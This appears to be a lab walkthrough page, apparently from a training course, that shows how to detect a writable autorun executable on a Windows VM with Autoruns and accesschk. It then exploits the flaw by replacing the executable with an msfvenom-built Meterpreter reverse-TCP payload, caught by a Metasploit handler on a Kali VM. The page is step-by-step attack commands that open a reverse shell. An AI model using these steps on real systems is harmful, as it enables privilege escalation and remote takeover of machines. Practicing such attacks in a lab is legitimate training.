<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Overview</title>
</head><body><span style="font-size: 15pt"><b>Detection</b><br/>
<br/>
Windows VM<br/>
<br/>
1. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe<br/>
2. In Autoruns, click on the ‘Logon’ tab.<br/>
3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.<br/>
4. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"<br/>
5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.<br/>
<br/>
<br/>
<b>Exploitation</b><br/>
<br/>
Kali VM<br/>
<br/>
1. Open command prompt and type: msfconsole<br/>
2. In Metasploit (msf &gt; prompt) type: use multi/handler<br/>
3. In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp<br/>
4. In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]<br/>
5. In Metasploit (msf &gt; prompt) type: run<br/>
6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe<br/>
7. Copy the generated file, program.exe, to the Windows VM.<br/>
<br/>
<b>Windows VM</b><br/>
<br/>
1. Place program.exe in ‘C:\Program Files\Autorun Program’.<br/>
2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.<br/>
<br/>
<b>Kali VM</b><br/>
<br/>
1. Wait for a new session to open in Metasploit.<br/>
2. In Metasploit (msf &gt; prompt) type: sessions -i [Session ID]<br/>
3. To confirm that the attack succeeded, in Metasploit (msf &gt; prompt) type: getuid</span></body></html>